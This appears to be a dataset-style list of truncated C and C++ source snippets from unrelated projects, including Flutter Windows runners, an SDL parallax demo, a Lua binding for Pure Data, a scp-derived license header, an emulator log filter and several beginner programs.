\"\\n\\n\";\r\n}\r\n// Function to perform various analyses and write results to \"analysis.txt\"\r\nvoid Analysis(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tofstream fileout(\"analysis.txt\");\r\n\tfileout << \"Grades:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) fileout << name[i * maximum_size + j];\r\n\t\tfileout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n\tfileout << \"\\nAverage of Students:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_si",
    "#include \"ofxOfeliaLua.h\"\n#include \"ofxOfeliaGL.h\"\n#include \"ofxOfeliaData.h\"\n#include <algorithm>\n#include <cctype>\n#include <deque>\n#include <cstring>\n#include <sstream>\n\n/*\n calling ofxOfeliaLua::doString(const char *s) function\n is like running the following script in Lua:\n\n * [ofelia define] object:\n\n local name = \"foo\" -- module name set as ofelia object argument\n package.preload[name] = nil\n package.loaded[name] = nil\n package.preload[name] = function(this)\n local ofelia = {}\n local M = ofelia\n s -- a written script in pd\n return M\n end\n\n * [ofelia function] object:\n\n local name = \"foo\" -- module name set as ofelia object argument\n package.preload[name] = nil\n package.loaded[name] = nil\n package.preload[name] = function(this)\n local ofelia = {}\n local M = ofelia\n function M.bang()\n return M.anything(nil)\n end\n function M.float(f)\n return M.anything(f)\n end\n function M.symbol(s)\n return M.anything(s)\n end\n function M.pointer(p)\n return M.anything(p)\n end\n function M.list(l)\n return M.anything(l)\n end\n function M.anything(a)\n s -- a written script in pd\n end\n return M\n end\n\n sending 'bang' message to [ofelia define] or [ofelia function] object\n calls ofxOfeliaLua::doFunction(t_symbol *s) function and it is like running\n the following script in Lua:\n\n local m = require(\"foo\") -- module name set as ofelia object argument\n if type(m.bang) == \"function\" then\n return m:bang() -- ofelia object will output the returned value through its outlet\n end\n */\n\nlua_State* ofxOfeliaLua::L;\n\nextern \"C\"\n{\n    int luaopen_of(lua_State* L);\n    int luaopen_pd(lua_State* L);\n    int luaopen_ofx(lua_State* L);\n    int luaopen_ImGui(lua_State* L);\n    int luaopen_print(lua_State* L);\n}\n\n/* redefined print function for the pd window */\nint l_my_print(lua_State* L)\n{\n    int argc = lua_gettop(L);\n    if (argc) startpost(luaL_tolstring(L, 1, nullptr));\n    for (int i = 2; i <= argc; ++i)\n    {\n        poststring(luaL_tolstring(L, i, nullptr));\n        lua_pop(L, 1); /* remove the string */\n    }\n    endpost();\n    return 0;\n}\n\nconst struct luaL_Reg printlib[] =\n{\n    {\"print\", l_my_print},\n    {NULL, NULL} /* end of array */\n};\n\nint luaopen_print(lua_State* L)\n{\n    lua_getglobal(L, \"_G\");\n#if LUA_VERSION_NUM < 502\n    luaL_register(L, NULL, printlib);\n#else\n    luaL_setfuncs(L, printlib, 0);\n#endif\n    lua_pop(L, 1);\n    return 1;\n}\n\nvoid ofxOfeliaLua::unpackModule(lua_State* L, const std::string& moduleName, const std::string& prefix)\n{\n    std::string upperPrefix = prefix;\n    std::transform(upperPrefix.begin(), upperPrefix.end(), upperPrefix.begin(), ::toupper);\n    upperPrefix += \"_\"; /* prefix for constants and enums */\n    lua_getglobal(L, moduleName.c_str());\n    lua_pushnil(L);\n    while (lua_next(L, -2) != 0)\n    {\n        const std::string& type = luaL_typename(L, -1);\n        const std::string& str = lua_tostring(L, -2);\n        std::string renamedStr;\n        lua_getfield(L, -3, str.c_str());\n        if ((type == \"table\" || type == \"userdata\") && (::isupper(str[0]) || ::isdigit(str[0]))) /* classes and structs */\n            renamedStr = prefix + str;\n        else if (type == \"function\") /* global functions */\n        {\n            renamedStr = str;\n            renamedStr[0] = static_cast<char>(::toupper(str[0]));\n            renamedStr = prefix + renamedStr;\n        }\n        else if (type == \"number\" || type == \"string\" || type == \"boolean\")\n        {\n            if (std::any_of(str.begin(), str.end(), ::islower)) /* static member variables */\n                renamedStr = prefix + str;\n            else /* constants or enums */\n                renamedStr = upperPrefix + str;\n        }\n        lua_setglobal(L, renamedStr.c_str());\n        lua_pop(L, 1);\n        lua_pushnil(L); /* assign nil to original element */\n        lua_setfield(L, -3, str.c_str());\n    }\n    lua_pop(L, 1);\n    lua_pushnil(L); /* assign nil to module */\n    lua_setglobal(L, moduleName.c_str());\n}\n\nbool ofxOfeliaLua::addGlobals(lua_State* L)\n{\n    lua_settop(L, 0);\n    const char* s =\n        \"ofRequire = require\\n\"\n        \"function ofTable(...)\\n\"\n        \"  return {...}\\n\"\n        \"end\\n\";\n    const int ret = luaL_dostring(L, s);\n    if (ret != LUA_OK)\n    {\n        pd_error(0, \"ofelia: %s\", lua_tostring(L, -1));\n        lua_pop(L, 1);\n        return false;\n    }\n    return true;\n}\n\nbool ofxOfeliaLua::init()\n{\n    /* initialize lua */\n    L = luaL_newstate();\n    if (L == nullptr)\n    {\n        pd_error(0, \"ofelia: failed initializing lua\");\n        return false;\n    }\n    /* open libs */\n    luaL_openlibs(L);\n    luaopen_of(L);\n    luaopen_pd(L);\n    luaopen_ofx(L);\n    luaopen_ImGui(L);\n    luaopen_print(L);\n\n    /* clear stack since opening libs leaves tables on the stack */\n    lua_settop(L, 0);\n\n    /* unpack module elements into global namespace with the new prefix */\n    unpackModule(L, \"of\", \"of\");\n    unpackModule(L, \"pd\", \"of\");\n    unpackModule(L, \"ofx\", \"ofx\");\n    unpackModule(L, \"ImGui\", \"ImGui\");\n\n    /* add GL preprocessor de",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"football_stats_app_v2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"test.h\"\n#include <SDL.h>\n#include <stdio.h>\n#include <SDL_image.h>\n#include <string>\n#include <vector>\n\nconst int SCREEN_WIDTH = 800;\nconst int SCREEN_HEIGHT = 600;\nconst int IMAGE_WIDTH = SCREEN_WIDTH + 300;\n\nSDL_Window* gWindow = NULL;\nSDL_Renderer* gRenderer = NULL;\nint speed = 0.1;\nint CameraX = 0;\nint textureWidthDiff = IMAGE_WIDTH - SCREEN_WIDTH;\n\nSDL_Texture* loadTexture(const std::string& path) {\n    // The final texture\n    SDL_Texture* newTexture = NULL;\n\n    // Load image at specified path\n    SDL_Surface* loadedSurface = IMG_Load(path.c_str());\n    if (loadedSurface == NULL) {\n        printf(\"Unable to load image %s! SDL_image Error: %s\\n\", path.c_str(), IMG_GetError());\n    }\n    else {\n        // Create texture from surface pixels\n        newTexture = SDL_CreateTextureFromSurface(gRenderer, loadedSurface);\n        if (newTexture == NULL) {\n            printf(\"Unable to create texture from %s! SDL Error: %s\\n\", path.c_str(), SDL_GetError());\n        }\n\n        // Get rid of old loaded surface\n        SDL_FreeSurface(loadedSurface);\n    }\n\n    return newTexture;\n}\n\nbool initSDL()\n{\n    // Initialize SDL\n    if (SDL_Init(SDL_INIT_VIDEO) < 0) {\n        printf(\"SDL could not initialize! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Create window\n    gWindow = SDL_CreateWindow(\"2D Rendering\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n    if (gWindow == NULL) {\n        printf(\"Window could not be created! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Create renderer\n    gRenderer = SDL_CreateRenderer(gWindow, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n    if (gRenderer == NULL) {\n        printf(\"Renderer could not be created! SDL_Error: %s\\n\", SDL_GetError());\n        return false;\n    }\n\n    // Set renderer color\n    SDL_SetRenderDrawColor(gRenderer, 0xFF, 0xFF, 0xFF, 0xFF);\n\n    // Allows for (Initializes) Image Loading abilities using SDL_image library\n    int imgFlags = IMG_INIT_PNG;\n    if (!(IMG_Init(imgFlags) & imgFlags)) {\n        printf(\"SDL_image could not initialize! SDL_image Error: %s\\n\", IMG_GetError());\n        return false;\n    }\n\n    return true;\n}\n\nvoid closeSDL()\n{\n    // Destroy window\n    SDL_DestroyRenderer(gRenderer);\n    SDL_DestroyWindow(gWindow);\n    gWindow = NULL;\n    gRenderer = NULL;\n\n    // Quit SDL subsystems\n    IMG_Quit();\n    SDL_Quit();\n}\n\nint main(int argc, char* argv[]) {\n    if (!initSDL()) {\n        printf(\"Failed to initialize SDL!\\n\");\n        return -1;\n    }\n\n    std::vector<SDL_Texture*> backgroundTextures;\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer0.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer1.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer2.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer3.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer4.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer5.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer6.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer7.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer8.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer9.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer10.png\"));\n    backgroundTextures.push_back(loadTexture(\"./Assets/Pixel_Forest/layer11.png\"));\n\n\n\n\n    SDL_Texture* backgroundFloor = loadTexture(\"./Assets/grassfloor.png\");\n    SDL_Texture* backgroundSky = loadTexture(\"./Assets/skytoon.jpg\");\n\n    // Main loop flag\n    bool quit = false;\n\n    // Event handler\n    SDL_Event e;\n\n    while (!quit) {\n        // Handle events on queue\n        while (SDL_PollEvent(&e) != 0) {\n            // User requests quit\n            if (e.type == SDL_QUIT) {\n                quit = true;\n            }\n        }\n\n        // Clear screen\n        SDL_RenderClear(gRenderer);\n\n        //SDL_Rect skyDest = { 0, -400, 800, 810 };\n        //SDL_RenderCopy(gRenderer, backgroundSky, NULL, &skyDest);\n\n        //SDL_RenderCopy(gRenderer, backgroundFloor, NULL, NULL);\n\n        for (SDL_Texture* texture : backgroundTextures) {\n            SDL_Rect textureDest = { 0, 0, IMAGE_WIDTH, SCREEN_HEIGHT };\n            SDL_RenderCopy(gRenderer, texture, NULL, &textureDest);\n        }\n\n        // Update screen\n        SDL_RenderPresent(gRenderer);\n    }\n\n    // Destroy textures\n    //SDL_DestroyTexture(enemyTexture);\n    SDL_DestroyTexture(backgroundFloor);\n    SDL_DestroyTexture(backgroundSky);\n\n    for (SDL_Texture* texture : backgroundTextures) {\n        SDL_DestroyTexture(texture);\n    }\n\n    // Close SDL\n    closeSDL();\n\n\treturn 0;\n}\n",
    "/********************************************************************************\n$Id: hscp.cpp 102 2010-12-26 13:47:53Z bunpojpn $\n\nhscp.cpp v 0.9.20 2010-12-25\nCopyright (c) 2009,2010 RCCS technical team of IMS,\n   Fumiyasu Mizutani,\n   Fumitsuna Teshima, Masataka Sawa,\n   Shigeki Naitoh,    Jun-ichi Matsuo,\n   Kensuke Iwahashi,  Takakazu Nagaya.\nAll rights reserved.\nWe special thanks to\n   Hironori Kogawa (Hitachi, Ltd., for the first try to merge UDT into scp),\n   UDT distributer (the board of trustees of the University of Illinois),\n   OpenSSH distributers, and other open source distributers.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this list of\n    conditions and the following disclaimer.\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation and/or\n    other materials provided with the distribution.\n  * Neither the name of the \"NINS (National Institutes of Natural Sciences),\n    IMS (Institute for Molecular Science)\" nor the names of its contributors may be\n    used to endorse or promote products derived from this software without specific\n    prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\nEXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANT ABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\nTHE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\nSTRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\nTHE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************************/\n/* Original copyrights of scp.c is under this line,                             */\n/********************************************************************************/\n/* $OpenBSD: scp.c,v 1.165 2009/12/20 07:28:36 guenther Exp $ */\n/*\n * scp - secure remote copy.  This is basically patched BSD rcp which\n * uses ssh to do the data transfer (instead of using rcmd).\n *\n * NOTE: This version should NOT be suid root.  (This uses ssh to\n * do the transfer and ssh has the necessary privileges.)\n *\n * 1995 Timo Rinne <tri@iki.fi>, Tatu Ylonen <ylo@cs.hut.fi>\n *\n * As far as I am concerned, the code I have written for this software\n * can be used freely for any purpose.  Any derived versions of this\n * software must be clearly marked as such, and if the derived work is\n * incompatible with the protocol description in the RFC file, it must be\n * called by a name other than \"ssh\" or \"Secure Shell\".\n */\n/*\n * Copyright (c) 1999 Theo de Raadt.  All rights reserved.\n * Copyright (c) 1999 Aaron Campbell.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n/*\n * Parts from:\n *\n * Copyright (c) 1983, 1990, 1992, 1993, 1995\n *\tThe Regents of the University of California.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *   ",
    "#include<stdio.h> \r\n\r\nvoid Traverse();\r\nvoid Insertion_at_begin();\r\nvoid Insertion_at_end();\r\nvoid Insertion_at_loc();\r\nvoid Deletion_at_begin();\r\nvoid Deletion_at_end();\r\nvoid Deletion_at_loc();\r\n\r\nint lb = 0;\r\nint ub = 5;\r\nint choice;\r\nint arr[5];\r\n\r\n\r\nvoid array()\r\n {\r\n    printf(\"The array elements are: \\n\");\r\n    for (int i = 0; i < 100; i++) \r\n\t{\r\n      printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nint main() \r\n{\r\n    do \r\n\t{\r\n    \tarray();\r\n        printf(\"Menu:\\n\");\r\n        printf(\"1:Traversing in array\\n\");\r\n        printf(\"2:Insertion at the beginning\\n\");\r\n        printf(\"3:Insertion at the end\\n\");\r\n        printf(\"4:Insertion at a particular location\\n\");\r\n        printf(\"5:Deletion at the beginning\\n\");\r\n        printf(\"6:Deletion at the end\\n\");\r\n        printf(\"7:Deletion at a particular location\\n\");\r\n        printf(\"8:EXIT\\n\");\r\n\r\n        printf(\"Enter your choice (1-8): \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                Traverse();\r\n                break;\r\n            case 2:\r\n                Insertion_at_begin();\r\n                break;\r\n            case 3:\r\n                Insertion_at_end();\r\n                break;\r\n            case 4:\r\n                Insertion_at_loc();\r\n                break;\r\n            case 5:\r\n                Deletion_at_begin();\r\n                break;\r\n            case 6:\r\n                Deletion_at_end();\r\n                break;\r\n            case 7:\r\n                Deletion_at_loc();\r\n                break;\r\n            case 8:\r\n                printf(\"Exiting the program. Goodbye!\\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice. Please enter a number between 1 and 8.\\n\");\r\n        }\r\n    } while (choice != 8);\r\n\r\n    return 0;\r\n}\r\n\r\nvoid Traverse()\r\n {\r\n    int temp;\r\n    if (ub < lb)\r\n\t{\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n\t else \r\n\t{\r\n        temp = lb;\r\n        while (temp <= ub) \r\n\t\t{\r\n            printf(\"%d\\n\", arr[temp]);\r\n            temp = temp + 1;\r\n        }\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_begin() \r\n{\r\n    int value;\r\n    int temp;\r\n    if (ub == 5 - 1)\r\n\t{\r\n        printf(\"Array is full\\n\");\r\n    } \r\n\telse if (ub < 0) \r\n\t{\r\n        ub = 0;\r\n        \r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[ub] = value;\r\n    } \r\n\telse \r\n\t{\r\n        temp = ub;\r\n        while (temp >= lb) \r\n\t\t{\r\n            arr[temp + 1] = arr[temp];\r\n            temp = temp - 1;\r\n        }\r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[lb] = value;\r\n    }\r\n    ub++;\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_end()\r\n{\r\n\tint value;\r\n\tif(ub==5-1)\r\n\t{\r\n\t  printf(\"Array is full\");\t\r\n\t}\r\n    else if(ub<0)\r\n    {\r\n    \tlb=0;\r\n    \tub=0;\r\n    \tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n    \tarr[ub]=value;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tub++;\r\n\t\tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n\t\tarr[ub]=value;\r\n\t}\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n\tprintf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_loc() \r\n{\r\n\tint loc;\r\n\tint value;\r\n\tint temp;\r\n\tprintf(\"enter the location where to add array:\");\r\n\tscanf(\"%d\",&loc);\r\n\tprintf(\"Enter the value to be inserted: \");\r\n    scanf(\"%d\",&value);\t\r\n\t\r\n   if(loc<0||ub==5-1||loc>ub+1)\r\n   {\r\n   \t  printf(\"Invalid location or array is full\\n\");\r\n   }\r\n\telse\r\n\t{\r\n        for (int i = ub; i >= loc; i--)   \r\n        {\r\n            arr[i + 1] = arr[i];\r\n        }\r\n        arr[loc] = value;\r\n        ub++;\r\n\r\n        printf(\"Array elements are:\\n\");\r\n        for (int i = lb; i <= ub; i++) \r\n        {\r\n            printf(\"%d\\n\", arr[i]);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Deletion_at_begin() \r\n{\r\n  if(ub<lb)\r\n  {\r\n  \tprintf(\"Array is empty\\n\");\r\n  }\r\n  else\r\n  {\r\n    lb++;\r\n  }\r\n    printf(\"Array after deletion:\\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n    {\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nvoid Deletion_at_end()\r\n{\r\n   if(ub<lb)\r\n  {\r\n    printf(\"Array is empty\\n\");\r\n  } \r\n  else\r\n  {\r\n\tub--;\r\n\tprintf(\"Array after deletion:\\n\");\r\n   for (int i = lb; i <= ub; i++) \r\n    {\r\n       printf(\"%d\\n\", arr[i]);\r\n    }\r\n  }\r\n  printf(\"\\n\");\r\n}\r\n\r\nvoid Deletion_at_loc()\r\n{\r\n    if (ub < lb)\r\n    {\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n    else\r\n    {\r\n        int loc;\r\n        printf(\"Enter the location where to delete element: \");\r\n        scanf(\"%d\", &loc);\r\n        if (loc < lb || loc > ub)\r\n        {\r\n            printf(\"Invalid location\\n\");\r\n        }\r\n        else\r\n        {\r\n            for (int i = loc; i < ub; i++)\r\n            {\r\n                arr[i] = arr[i + 1];\r\n            }\r\n            ub--;\r\n            printf(\"Array after deletion:\\n\");\r\n            for (int i = lb; i <= ub; i",
    "#include <iostream>\n#include \"BigNumber.h\"\n\nusing namespace std;\n\nint main() {\n    BigReal n1(\"12345678901234567890.12345678901234567890\");\n    BigReal n2(\"-12345678901234567890.12345678901234567890\");\n    BigReal n3(\"2.00000000000000000000000001\");\n    BigReal n4(\"4563173412.1234671412413\");\n    BigReal n7(\"11111111111111.1111111111\");\n    BigReal n8(\"-11111111111111.1111111111\");\n    BigReal n9(\"11111111111111.1111111111\");\n    BigReal n5 = n1+n2;\n    BigReal n6 =n3-n4;\n    cout<<n5<<endl;\n    cout<<n6<<endl;\n    if (n1>n2)\n        cout<<\"N1 is bigger than N2. \"<<endl;\n    else\n        cout<<\"N1 is less than or equal to N2. \"<<endl;\n\n    if (n2<n4)\n        cout<<\"N2 is less than N4. \"<<endl;\n    else\n        cout<<\"N4 is bigger than or equal to N2. \"<<endl;\n\n    if (n7==n8)\n        cout<<\"N7 is equal to N8. \"<<endl;\n    else\n        cout<<\"N7 is not equal to N8. \"<<endl;\n\n    if (n7==n9)\n        cout<<\"N7 is equal to N9. \"<<endl;\n    else\n        cout<<\"N7 is not equal to N9. \"<<endl;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"travel_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// SPDX-FileCopyrightText: 2014 Citra Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include <algorithm>\n#include \"common/logging/filter.h\"\n#include \"common/string_util.h\"\n\nnamespace Common::Log {\nnamespace {\ntemplate <typename It>\nLevel GetLevelByName(const It begin, const It end) {\n    for (u8 i = 0; i < static_cast<u8>(Level::Count); ++i) {\n        const char* level_name = GetLevelName(static_cast<Level>(i));\n        if (Common::ComparePartialString(begin, end, level_name)) {\n            return static_cast<Level>(i);\n        }\n    }\n    return Level::Count;\n}\n\ntemplate <typename It>\nClass GetClassByName(const It begin, const It end) {\n    for (u8 i = 0; i < static_cast<u8>(Class::Count); ++i) {\n        const char* level_name = GetLogClassName(static_cast<Class>(i));\n        if (Common::ComparePartialString(begin, end, level_name)) {\n            return static_cast<Class>(i);\n        }\n    }\n    return Class::Count;\n}\n\ntemplate <typename Iterator>\nbool ParseFilterRule(Filter& instance, Iterator begin, Iterator end) {\n    auto level_separator = std::find(begin, end, ':');\n    if (level_separator == end) {\n        LOG_ERROR(Log, \"Invalid log filter. Must specify a log level after `:`: {}\",\n                  std::string(begin, end));\n        return false;\n    }\n\n    const Level level = GetLevelByName(level_separator + 1, end);\n    if (level == Level::Count) {\n        LOG_ERROR(Log, \"Unknown log level in filter: {}\", std::string(begin, end));\n        return false;\n    }\n\n    if (Common::ComparePartialString(begin, level_separator, \"*\")) {\n        instance.ResetAll(level);\n        return true;\n    }\n\n    const Class log_class = GetClassByName(begin, level_separator);\n    if (log_class == Class::Count) {\n        LOG_ERROR(Log, \"Unknown log class in filter: {}\", std::string(begin, end));\n        return false;\n    }\n\n    instance.SetClassLevel(log_class, level);\n    return true;\n}\n} // Anonymous namespace\n\n/// Macro listing all log classes. Code should define CLS and SUB as desired before invoking this.\n#define ALL_LOG_CLASSES()                                                                          \\\n    CLS(Log)                                                                                       \\\n    CLS(Common)                                                                                    \\\n    SUB(Common, Filesystem)                                                                        \\\n    SUB(Common, Memory)                                                                            \\\n    CLS(Core)                                                                                      \\\n    SUB(Core, ARM)                                                                                 \\\n    SUB(Core, Timing)                                                                              \\\n    CLS(Config)                                                                                    \\\n    CLS(Debug)                                                                                     \\\n    SUB(Debug, Emulated)                                                                           \\\n    SUB(Debug, GPU)                                                                                \\\n    SUB(Debug, Breakpoint)                                                                         \\\n    SUB(Debug, GDBStub)                                                                            \\\n    CLS(Kernel)                                                                                    \\\n    SUB(Kernel, SVC)                                                                               \\\n    CLS(Service)                                                                                   \\\n    SUB(Service, ACC)                                                                              \\\n    SUB(Service, Audio)                                                                            \\\n    SUB(Service, AM)                                                                               \\\n    SUB(Service, AOC)                                                                              \\\n    SUB(Service, APM)                                                                              \\\n    SUB(Service, ARP)                                                                              \\\n    SUB(Service, BCAT)                                                                             \\\n    SUB(Service, BPC)                                                                              \\\n    SUB(Service, BGTC)                                                                             \\\n    SUB(Service, BTDRV)                                                                            \\\n    SUB(Service, BTM)                                                                              \\\n    SUB(Service, Capture)                                                                          \\\n    SUB(Service, ERPT)",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a 